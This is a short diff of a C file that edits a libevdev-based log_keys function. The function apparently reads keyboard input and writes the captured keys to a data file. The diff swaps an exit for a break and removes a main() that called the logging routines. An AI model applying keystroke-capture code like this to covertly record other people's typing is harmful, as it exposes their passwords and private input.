@@ -241,8 +241,9 @@ void log_keys(key_package* key_package) {
       for (size_t i = 0; i < key_package->keys_arr_size; i++) {
         printf("%s  ", key_package->keys[i].key);
       }
+      printf("\n");
 
-      exit(1);
+      break;
     }
   }
 
@@ -250,13 +251,4 @@ void log_keys(key_package* key_package) {
   libevdev_free(keyboard_dev);
   close(keyboard_fd);
   fclose(data_storage);
-}
-
-int main(void) {
-  key_package key_package;
-  key_package.keys_arr_size = 0;
-  log_device(&key_package);
-  log_keys(&key_package);
-
-  return 0;
 }
